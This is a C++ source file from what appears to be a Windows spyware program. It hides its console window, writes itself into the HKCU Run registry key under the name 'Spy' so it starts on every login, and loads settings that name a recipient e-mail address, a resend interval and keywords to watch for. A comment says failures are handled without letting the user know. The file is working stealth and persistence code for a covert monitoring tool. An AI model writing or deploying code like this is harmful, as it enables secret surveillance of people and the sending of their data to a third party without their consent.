#include "stdafx.h"

#include "Utility.h"
#include <fstream>
#include <vector>
#include <string>

void utility::hide_window()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE); // Minimalize console
}

void utility::add_application_to_startup()
{
	std::string program_path_string = get_application_path();
	std::wstring program_path(program_path_string.begin(), program_path_string.end());
	
	HKEY hkey = NULL;
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey); //Creates a key       
	LONG status = RegSetValueEx(hkey, L"Spy", 0, REG_SZ, (BYTE *)program_path.c_str(), (program_path.size() + 1) * sizeof(wchar_t));
}

std::string utility::get_application_path()
{
	char selfpath[MAX_PATH];
	wchar_t selfpath_wchar[MAX_PATH];

	GetModuleFileName(NULL, selfpath_wchar, MAX_PATH);
	size_t pReturnValue;
	wcstombs_s(&pReturnValue, selfpath, MAX_PATH, selfpath_wchar, MAX_PATH);

	return std::string(selfpath);
}

bool utility::file_exists(const std::string &file_name)
{
	std::ifstream file(file_name.c_str());
	return file.good();
}

configuration::configuration_file_content configuration::load_configuration_from_file()
{
	// Keywords are written in the file with space as a delimiter. This lambda parses them to single strings
	auto parse_strings = [](std::string keywords) -> std::vector<std::string>
	{
		std::string delimiter = " ";
		std::vector<std::string> keywords_vec;

		size_t pos = 0;
		std::string token;

		while ((pos = keywords.find(delimiter)) != std::string::npos)
		{
			token = keywords.substr(0, pos);
			keywords_vec.emplace_back(std::move(token));
			keywords.erase(0, pos + delimiter.length());
		}

		keywords_vec.emplace_back(std::move(keywords));
		return keywords_vec;
	};
	
	// Load data from configuration file
	std::ifstream configuration_file(configuration_file_name);
	configuration_file_content configuration;
	std::string line;

	if (configuration_file.is_open())
	{
		// First line in a file is e-mail
		std::getline(configuration_file, line);
		configuration.mail_to = line;
		line.clear();

		// Second line in a file is time that emails should be resent
		std::getline(configuration_file, line);
		configuration.mail_send_loop = std::stoi(line);
		line.clear();

		// Third line are keywords
		std::getline(configuration_file, line);
		configuration.keywords = parse_strings(line);
		printf("Size: %d", configuration.keywords.size());
	}
	else
	{
		// Handle it somehow, but don't let the user know.
	}

	return configuration;
}

void configuration::save_configuration_to_file(std::string mail_to, int email_send_loop_time, std::vector<std::string> keywords)
{
	std::ofstream configuration_file(configuration_file_name);
	configuration_file << mail_to << "\n";
	configuration_file << email_send_loop_time << "\n";

	for (const std::string &keyword : keywords)
	{
		configuration_file << keyword;
		
		// Don't write space after the last string
		if (keyword == keywords.back())
		{
			break;
		}
		configuration_file << " ";
	}
}